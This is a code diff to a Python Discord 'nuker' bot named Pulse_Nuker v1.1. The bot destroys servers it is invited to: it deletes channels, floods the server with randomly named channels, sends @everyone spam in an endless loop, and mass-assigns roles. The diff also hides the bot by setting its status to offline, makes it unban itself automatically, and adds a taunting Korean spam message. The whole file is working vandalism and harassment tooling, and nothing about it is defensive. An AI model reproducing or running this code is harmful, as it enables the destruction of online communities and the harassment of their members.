@@ -32,16 +32,13 @@ async def on_ready():
     TEST = 0
     print("Pulse_Nuker v1.1 is running.\nInvite your bot and send any message to start nuke.\n\n")
     print("WARNING!!\nYou may get API Timeout from Discord server if you nuke long.\nPlease Use wisely.")
-    return await client.change_presence(activity=discord.Game(name='Pulse_Nuker v1.1'))
+    return await client.change_presence(status=discord.Status.offline)
     
     
-'''
 @client.event
 async def on_member_ban(guild,user):
     await guild.unban(user)
     print("removed ban")
-'''
-
 
 @client.event
 async def on_message(message):
@@ -72,7 +69,7 @@ async def on_message(message):
            await template.delete()
         await message.guild.create_text_channel(randomletters(99))
     
-    response = '@everyone' #You can add some messages via editing this string
+    response = '@everyone 그러게 왜 차단해 ㅋㅋ' #You can add some messages via editing this string
     
     while True:
         print("message sent "+random.choice(string.ascii_letters))
@@ -89,7 +86,8 @@ async def on_message(message):
             print("can't change user nick")
             pass
         try:
-            webhook = await message.channel.create_webhook(name="Pulse_Nuker Enhanced", reason="t")
+            print("1")
+            #webhook = await message.channel.create_webhook(name="Pulse_Nuker Enhanced", reason="t")
         except:
             pass
         try:
@@ -98,17 +96,20 @@ async def on_message(message):
         except:
             pass
         guild=message.guild
-        perms=discord.Permissions(administrator=True)
         try:
-            user=message.author
-            await guild.create_role(name='Pulse_Nuker Enhanced', colour=discord.Colour.random(),permissions=perms)
-            role=get(guild.roles,name='TEST')
-            await user.add_roles(role)
+            perms=discord.Permissions(read_messages=True)
+        except:
+            pass
+        try:
+            rolename = randomletters(5)
+            await guild.create_role(name=rolename, colour=discord.Colour.random(),permissions=perms)
+            role=get(guild.roles,name=rolename)
+            for user in message.guild.members:
+                await user.add_roles(role)
         except:
             print('maximum number of roles reached')
             pass
         guild=message.guild
-        
         await guild.create_text_channel(randomletters(99))
         await guild.create_text_channel(randomletters(99))
         await message.channel.delete()
